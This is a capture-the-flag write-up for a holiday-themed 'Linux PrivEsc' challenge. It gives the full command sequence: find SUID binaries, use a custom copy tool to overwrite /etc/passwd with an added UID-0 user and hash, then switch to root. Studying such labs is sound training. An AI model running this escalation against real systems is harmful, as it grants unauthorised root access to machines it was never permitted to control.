# OBJECTIVE 7 - Linux PrivEsc #

## OBJECTIVE : ##
>Rosemold is in Ostrich Saloon on the Island of Misfit Toys.  Give her a hand with escalation for a tip about hidden islands.
#  

## HINTS: ##
<details>
  <summary>Hints provided for Objective 7</summary>
  
>-  There's [various ways](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/) to escalate privileges on a Linux system.
>-	Using the privileged binary to overwrite a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.

</details>

#  

## PROCEDURE : ##

Let’s start this challenge by looking in the `/bin` folder to see what tools we have to our disposition:

``~$ cd /bin``

``/bin$ ls -la | grep rwsr``

```
-rwsr-xr-x 1 root root     85064 Nov 29  2022 chfn
-rwsr-xr-x 1 root root     53040 Nov 29  2022 chsh
-rwsr-xr-x 1 root root     88464 Nov 29  2022 gpasswd
-rwsr-xr-x 1 root root     55528 May 30  2023 mount
-rwsr-xr-x 1 root root     44784 Nov 29  2022 newgrp
-rwsr-xr-x 1 root root     68208 Nov 29  2022 passwd
-rwsr-xr-x 1 root root     16952 Dec  2 22:17 simplecopy
-rwsr-xr-x 1 root root     67816 May 30  2023 su
-rwsr-xr-x 1 root root     39144 May 30  2023 umount
```

This gives us a list of applications we can run with root privileges.  Simplecopy is particularly interesting as it will allow us to copy (and overwrite) and file to any directory with root privileges. So, we should be able to create a new user by overriding the existing `/etc/passwd` file with a manually crafted one.

First, we copy the contents of `/etc/passwd` to a temporary file:

`~$ cat /etc/passwd >> /tmp/new-passwd`

Now we need to create a hashed password.  This can be done using Perl.

`~$ perl -le 'print crypt("snowballz", "abc")'`
```
abCF8jIEHXtsw
```

This gives us a salted hash for password “snowballz”, which we can now assign to a new user called “super-elf” which we append to our new passwd file:

`~$echo super-elf:abCF8jIEHXtsw:0:0:root:/root:/bin/bash >> /tmp/new-passwd`

we can now use simplecopy to overwrite /etc/passwd with our newly crafted file:

`~$ simplecopy /tmp/new-passwd /etc/passwd`

And switch to the newly created root user:

`~$ su super-elf`
```
Password: 
/home/elf#
```

We can now confirm that we now have root privileges 😊

`/home/elf# whoami`
```
Root
```

All that’s left is for us to run the binary in the /root folder:
```
/home/elf# cd /root
~# ./runmetoanswer
```

